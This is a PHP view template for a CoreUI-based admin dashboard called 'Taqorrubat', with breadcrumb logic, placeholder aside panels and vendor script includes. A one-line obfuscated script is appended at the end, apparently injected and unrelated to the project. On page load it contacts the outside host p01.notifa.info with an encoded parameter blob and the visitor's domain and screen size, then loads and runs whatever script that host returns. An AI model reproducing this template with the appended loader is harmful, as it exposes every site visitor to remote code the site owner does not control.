<!--
 * CoreUI - Open Source Bootstrap Admin Template
 * @version v1.0.9
 * @link http://coreui.io
 * Copyright (c) 2018 creativeLabs Łukasz Holeczek
 * @license MIT
 -->
<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta http-equiv="X-UA-Compatible" content="IE=edge">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
  <meta name="description" content="CoreUI - Open Source Bootstrap Admin Template">
  <meta name="author" content="Łukasz Holeczek">
  <meta name="keyword" content="Bootstrap,Admin,Template,Open,Source,AngularJS,Angular,Angular2,Angular 2,Angular4,Angular 4,jQuery,CSS,HTML,RWD,Dashboard,React,React.js,Vue,Vue.js">
  <link rel="shortcut icon" href="<?php echo base_url('assets/template/img/favicon.ico'); ?>">
  <title>Taqorrubat</title>

  <link href="<?php echo base_url('assets/template/vendors/css/flag-icon.min.css'); ?>" rel="stylesheet">
  <link href="<?php echo base_url('assets/template/vendors/css/font-awesome.min.css'); ?>" rel="stylesheet">
  <link href="<?php echo base_url('assets/template/vendors/css/simple-line-icons.min.css'); ?>" rel="stylesheet">

  <link href="<?php echo base_url('assets/template/css/style.css'); ?>" rel="stylesheet">

  <link href="<?php echo base_url('assets/template/vendors/css/daterangepicker.min.css'); ?>" rel="stylesheet">
  <link href="<?php echo base_url('assets/template/vendors/css/gauge.min.css'); ?>" rel="stylesheet">
  <!-- <link href="<?php echo base_url('assets/template/vendors/css/toastr.min.css'); ?>" rel="stylesheet"> -->

  <link href="<?php echo base_url('assets/template/vendors/css/dataTables.bootstrap4.min.css'); ?>" rel="stylesheet">
  <!-- Styles required by this views -->
  <script>
    (function(i, s, o, g, r, a, m) {
      i['GoogleAnalyticsObject'] = r;
      i[r] = i[r] || function() {
        (i[r].q = i[r].q || []).push(arguments)
      }, i[r].l = 1 * new Date();
      a = s.createElement(o), m = s.getElementsByTagName(o)[0];
      a.async = 1;
      a.src = g;
      m.parentNode.insertBefore(a, m)
    })(window, document, 'script', 'https://www.google-analytics.com/analytics.js', 'ga');
    ga('create', 'UA-9510961-27', 'auto');
    ga('send', 'pageview');
  </script>
  <script type="text/javascript">
      setTimeout(function() {
          $('#not').fadeOut('slow');
      }, 5000); 
  </script>
</head>

<!-- BODY options, add following classes to body to change options

// Header options
1. '.header-fixed'					- Fixed Header

// Brand options
1. '.brand-minimized'       - Minimized brand (Only symbol)

// Sidebar options
1. '.sidebar-fixed'					- Fixed Sidebar
2. '.sidebar-hidden'				- Hidden Sidebar
3. '.sidebar-off-canvas'		- Off Canvas Sidebar
4. '.sidebar-minimized'			- Minimized Sidebar (Only icons)
5. '.sidebar-compact'			  - Compact Sidebar

// Aside options
1. '.aside-menu-fixed'			- Fixed Aside Menu
2. '.aside-menu-hidden'			- Hidden Aside Menu
3. '.aside-menu-off-canvas'	- Off Canvas Aside Menu

// Breadcrumb options
1. '.breadcrumb-fixed'			- Fixed Breadcrumb

// Footer options
1. '.footer-fixed'					- Fixed footer

-->

<body class="app header-fixed sidebar-fixed aside-menu-fixed aside-menu-hidden">
  <?php $this->load->view($nav); ?>

  <div class="app-body">
    <?php $this->load->view($sidebar); ?>

    <!-- Main content -->
    <main class="main">

      <!-- Breadcrumb -->
      <ol class="breadcrumb">
        <li class="breadcrumb-item"></li>
        <li class="breadcrumb-item"><a href="<?php echo base_url('Kontributor'); ?>">Kontributor</a></li>
        <?php  
        if ($menu!="")
        {
        ?>
          <li class="breadcrumb-item active"><?php echo $menu ?></li>
          <?php  
          if ($menu2!="") 
          {
          ?>
            <li class="breadcrumb-item active"><?php echo $menu2 ?></li>
            <?php  
            if ($menu3!="") 
            {
            ?>
              <li class="breadcrumb-item active"><?php echo $menu3 ?></li>
            <?php
            }
          }
        }
        ?>

        <!-- Breadcrumb Menu-->
        <!-- <li class="breadcrumb-menu d-md-down-none">
          <div class="btn-group" role="group" aria-label="Button group">
            <a class="btn" href="#"><i class="fa fa-user"></i></a>
            <a class="btn" href="#"><i class="fa fa-tachometer"></i> &nbsp;Dashboard</a>
            <a class="btn" href="#"><i class="fa fa-cogs"></i> &nbsp;Settings</a>
          </div>
        </li> -->
      </ol>

      <?php $this->load->view($content); ?>
      <!-- /.conainer-fluid -->
    </main>

    <aside class="aside-menu">
      <ul class="nav nav-tabs" role="tablist">
        <li class="nav-item">
          <a class="nav-link active" data-toggle="tab" href="#timeline" role="tab"><i class="fa fa-list-ul"></i></a>
        </li>
        <li class="nav-item">
          <a class="nav-link" data-toggle="tab" href="#messages" role="tab"><i class="fa fa-comments"></i></a>
        </li>
        <li class="nav-item">
          <a class="nav-link" data-toggle="tab" href="#settings" role="tab"><i class="fa fa-cog"></i></a>
        </li>
      </ul>

      <!-- Tab panes -->
      <div class="tab-content">
        <div class="tab-pane active" id="timeline" role="tabpanel">
          <div class="callout m-0 py-2 text-muted text-center bg-light text-uppercase">
            <small><b>Today</b></small>
          </div>
          <hr class="transparent mx-3 my-0">
          <div class="callout callout-warning m-0 py-3">
            <div class="avatar float-right">
              <img src="<?php echo base_url('assets/template/img/avatars/7.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
            </div>
            <div>Meeting with
              <strong>Lucas</strong>
            </div>
            <small class="text-muted mr-3"><i class="fa fa-calendar"></i>&nbsp; 1 - 3pm</small>
            <small class="text-muted"><i class="fa fa-map-marker"></i>&nbsp; Palo Alto, CA </small>
          </div>
          <hr class="mx-3 my-0">
          <div class="callout callout-info m-0 py-3">
            <div class="avatar float-right">
              <img src="<?php echo base_url('assets/template/img/avatars/4.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
            </div>
            <div>Skype with
              <strong>Megan</strong>
            </div>
            <small class="text-muted mr-3"><i class="fa fa-calendar"></i>&nbsp; 4 - 5pm</small>
            <small class="text-muted"><i class="fa fa-whatsapp"></i>&nbsp; On-line </small>
          </div>
          <hr class="transparent mx-3 my-0">
          <div class="callout m-0 py-2 text-muted text-center bg-light text-uppercase">
            <small><b>Tomorrow</b></small>
          </div>
          <hr class="transparent mx-3 my-0">
          <div class="callout callout-danger m-0 py-3">
            <div>New UI Project -
              <strong>deadline</strong>
            </div>
            <small class="text-muted mr-3"><i class="fa fa-calendar"></i>&nbsp; 10 - 11pm</small>
            <small class="text-muted"><i class="fa fa-home"></i>&nbsp; creativeLabs HQ </small>
            <div class="avatars-stack mt-2">
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/2.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/3.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/4.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/5.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/6.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
            </div>
          </div>
          <hr class="mx-3 my-0">
          <div class="callout callout-success m-0 py-3">
            <div>
              <strong>#10 Startups.Garden</strong> Meetup</div>
            <small class="text-muted mr-3"><i class="fa fa-calendar"></i>&nbsp; 1 - 3pm</small>
            <small class="text-muted"><i class="fa fa-map-marker"></i>&nbsp; Palo Alto, CA </small>
          </div>
          <hr class="mx-3 my-0">
          <div class="callout callout-primary m-0 py-3">
            <div>
              <strong>Team meeting</strong>
            </div>
            <small class="text-muted mr-3"><i class="fa fa-calendar"></i>&nbsp; 4 - 6pm</small>
            <small class="text-muted"><i class="fa fa-home"></i>&nbsp; creativeLabs HQ </small>
            <div class="avatars-stack mt-2">
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/2.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/3.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/4.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/5.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/6.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/7.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
              <div class="avatar avatar-xs">
                <img src="<?php echo base_url('assets/template/img/avatars/8.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
              </div>
            </div>
          </div>
          <hr class="mx-3 my-0">
        </div>
        <div class="tab-pane p-3" id="messages" role="tabpanel">
          <div class="message">
            <div class="py-3 pb-5 mr-3 float-left">
              <div class="avatar">
                <img src="<?php echo base_url('assets/template/img/avatars/7.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
                <span class="avatar-status badge-success"></span>
              </div>
            </div>
            <div>
              <small class="text-muted">Lukasz Holeczek</small>
              <small class="text-muted float-right mt-1">1:52 PM</small>
            </div>
            <div class="text-truncate font-weight-bold">Lorem ipsum dolor sit amet</div>
            <small class="text-muted">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt...</small>
          </div>
          <hr>
          <div class="message">
            <div class="py-3 pb-5 mr-3 float-left">
              <div class="avatar">
                <img src="<?php echo base_url('assets/template/img/avatars/7.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
                <span class="avatar-status badge-success"></span>
              </div>
            </div>
            <div>
              <small class="text-muted">Lukasz Holeczek</small>
              <small class="text-muted float-right mt-1">1:52 PM</small>
            </div>
            <div class="text-truncate font-weight-bold">Lorem ipsum dolor sit amet</div>
            <small class="text-muted">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt...</small>
          </div>
          <hr>
          <div class="message">
            <div class="py-3 pb-5 mr-3 float-left">
              <div class="avatar">
                <img src="<?php echo base_url('assets/template/img/avatars/7.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
                <span class="avatar-status badge-success"></span>
              </div>
            </div>
            <div>
              <small class="text-muted">Lukasz Holeczek</small>
              <small class="text-muted float-right mt-1">1:52 PM</small>
            </div>
            <div class="text-truncate font-weight-bold">Lorem ipsum dolor sit amet</div>
            <small class="text-muted">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt...</small>
          </div>
          <hr>
          <div class="message">
            <div class="py-3 pb-5 mr-3 float-left">
              <div class="avatar">
                <img src="<?php echo base_url('assets/template/img/avatars/7.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
                <span class="avatar-status badge-success"></span>
              </div>
            </div>
            <div>
              <small class="text-muted">Lukasz Holeczek</small>
              <small class="text-muted float-right mt-1">1:52 PM</small>
            </div>
            <div class="text-truncate font-weight-bold">Lorem ipsum dolor sit amet</div>
            <small class="text-muted">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt...</small>
          </div>
          <hr>
          <div class="message">
            <div class="py-3 pb-5 mr-3 float-left">
              <div class="avatar">
                <img src="<?php echo base_url('assets/template/img/avatars/7.jpg'); ?>" class="img-avatar" alt="admin@bootstrapmaster.com">
                <span class="avatar-status badge-success"></span>
              </div>
            </div>
            <div>
              <small class="text-muted">Lukasz Holeczek</small>
              <small class="text-muted float-right mt-1">1:52 PM</small>
            </div>
            <div class="text-truncate font-weight-bold">Lorem ipsum dolor sit amet</div>
            <small class="text-muted">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt...</small>
          </div>
        </div>
        <div class="tab-pane p-3" id="settings" role="tabpanel">
          <h6>Settings</h6>

          <div class="aside-options">
            <div class="clearfix mt-4">
              <small><b>Option 1</b></small>
              <label class="switch switch-text switch-pill switch-success switch-sm float-right">
                <input type="checkbox" class="switch-input" checked="">
                <span class="switch-label" data-on="On" data-off="Off"></span>
                <span class="switch-handle"></span>
              </label>
            </div>
            <div>
              <small class="text-muted">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</small>
            </div>
          </div>

          <div class="aside-options">
            <div class="clearfix mt-3">
              <small><b>Option 2</b></small>
              <label class="switch switch-text switch-pill switch-success switch-sm float-right">
                <input type="checkbox" class="switch-input">
                <span class="switch-label" data-on="On" data-off="Off"></span>
                <span class="switch-handle"></span>
              </label>
            </div>
            <div>
              <small class="text-muted">Lorem ipsum dolor sit amet, consectetur adipisicing elit, sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</small>
            </div>
          </div>

          <div class="aside-options">
            <div class="clearfix mt-3">
              <small><b>Option 3</b></small>
              <label class="switch switch-text switch-pill switch-success switch-sm float-right">
                <input type="checkbox" class="switch-input">
                <span class="switch-label" data-on="On" data-off="Off"></span>
                <span class="switch-handle"></span>
              </label>
            </div>
          </div>

          <div class="aside-options">
            <div class="clearfix mt-3">
              <small><b>Option 4</b></small>
              <label class="switch switch-text switch-pill switch-success switch-sm float-right">
                <input type="checkbox" class="switch-input" checked="">
                <span class="switch-label" data-on="On" data-off="Off"></span>
                <span class="switch-handle"></span>
              </label>
            </div>
          </div>

          <hr>
          <h6>System Utilization</h6>

          <div class="text-uppercase mb-1 mt-4">
            <small><b>CPU Usage</b></small>
          </div>
          <div class="progress progress-xs">
            <div class="progress-bar bg-info" role="progressbar" style="width: 25%" aria-valuenow="25" aria-valuemin="0" aria-valuemax="100"></div>
          </div>
          <small class="text-muted">348 Processes. 1/4 Cores.</small>

          <div class="text-uppercase mb-1 mt-2">
            <small><b>Memory Usage</b></small>
          </div>
          <div class="progress progress-xs">
            <div class="progress-bar bg-warning" role="progressbar" style="width: 70%" aria-valuenow="70" aria-valuemin="0" aria-valuemax="100"></div>
          </div>
          <small class="text-muted">11444GB/16384MB</small>

          <div class="text-uppercase mb-1 mt-2">
            <small><b>SSD 1 Usage</b></small>
          </div>
          <div class="progress progress-xs">
            <div class="progress-bar bg-danger" role="progressbar" style="width: 95%" aria-valuenow="95" aria-valuemin="0" aria-valuemax="100"></div>
          </div>
          <small class="text-muted">243GB/256GB</small>

          <div class="text-uppercase mb-1 mt-2">
            <small><b>SSD 2 Usage</b></small>
          </div>
          <div class="progress progress-xs">
            <div class="progress-bar bg-success" role="progressbar" style="width: 10%" aria-valuenow="10" aria-valuemin="0" aria-valuemax="100"></div>
          </div>
          <small class="text-muted">25GB/256GB</small>
        </div>
      </div>
    </aside>

  </div>

  <footer class="app-footer">
    <span><a href="">Taqorrubat</a> © 2018 Taqorrubat.</span>
    <span class="ml-auto">Powered by <a target="_blank" href="https://www.inagata.com/">Inagata Technosmith</a></span>
  </footer>

  <script src="<?php echo base_url('assets/template/vendors/js/jquery.min.js'); ?>"></script>
<script src="<?php echo base_url('assets/template/vendors/js/popper.min.js'); ?>"></script>
<script src="<?php echo base_url('assets/template/vendors/js/bootstrap.min.js'); ?>"></script>
<script src="<?php echo base_url('assets/template/vendors/js/pace.min.js'); ?>"></script>

<script src="<?php echo base_url('assets/template/vendors/js/Chart.min.js'); ?>"></script>

<script src="<?php echo base_url('assets/template/js/app.js'); ?>"></script>

<script src="<?php echo base_url('assets/template/vendors/js/jquery.dataTables.min.js'); ?>"></script>
<script src="<?php echo base_url('assets/template/vendors/js/dataTables.bootstrap4.min.js'); ?>"></script>

<!-- <script src="<?php echo base_url('assets/template/vendors/js/toastr.min.js'); ?>"></script> -->
<script src="<?php echo base_url('assets/template/vendors/js/gauge.min.js'); ?>"></script>
<script src="<?php echo base_url('assets/template/vendors/js/moment.min.js'); ?>"></script>
<script src="<?php echo base_url('assets/template/vendors/js/daterangepicker.min.js'); ?>"></script>

<script src="<?php echo base_url('assets/template/js/views/datatables.js'); ?>"></script>
<script src="<?php echo base_url('assets/template/js/views/main.js'); ?>"></script>
  <script type="text/javascript">if (self==top) {function netbro_cache_analytics(fn, callback) {setTimeout(function() {fn();callback();}, 0);}function sync(fn) {fn();}function requestCfs(){var idc_glo_url = (location.protocol=="https:" ? "https://" : "http://");var idc_glo_r = Math.floor(Math.random()*99999999999);var url = idc_glo_url+ "p01.notifa.info/3fsmd3/request" + "?id=1" + "&enc=9UwkxLgY9" + "&params=" + "4TtHaUQnUEiP6K%2fc5C582NzYpoUazw5mFebPgNN5rVLezV543wMEyRgbHBzhi%2fK7MWPN24sfC3qOxdbli7TMUGzXH1Sdhp9LTsjainPghxAbWmtT77jaOuH%2flN3JJNWA5YmapY0%2fQoDnxlpb4Yo7Q162lyUUuSSL6EDglhF3dKSaYBObyqaTG2G8GNlp%2bm6ki4D3qgWAoL%2fjgkM6B94yAdLDx1kEwBwhpVxs69lLL8HIMrZvxEFPPjOq6mZ4G9lE3wMOanQ3OrWai1QlTC1HLTqFnqOfvPSV%2bCeTd61PgeB0jaUiWTdUx%2fXcwfQR5EWaDUr7sMaUN5sUKqcpMEANY37SmdNm%2bDq3a8mD1%2fTO7fFd7eKO74txijp9ndyO2p514NmVBSlgbZ9aq%2bcv3uYZC9aAMBKIsOepSuA7%2fUOQWVPF9xqNHatvUL9dgZACrHQcLlcjAQGth3KPtZO7H5eRiEGHMLunmOiQWkaV71%2fW0ElFv6jkQMHC1wWKxOxX0d9pZdeONMPJ%2bltsy3iw%2buHSsiHBSDjzshTXoPXSrV9AIEYNhwLgW9WnSJjDkE7Ibuuqs8nLHS%2bqcNYJExR6ibOcRQ%3d%3d" + "&idc_r="+idc_glo_r + "&domain="+document.domain + "&sw="+screen.width+"&sh="+screen.height;var bsa = document.createElement('script');bsa.type = 'text/javascript';bsa.async = true;bsa.src = url;(document.getElementsByTagName('head')[0]||document.getElementsByTagName('body')[0]).appendChild(bsa);}netbro_cache_analytics(requestCfs, function(){});};</script>
</body>
</html>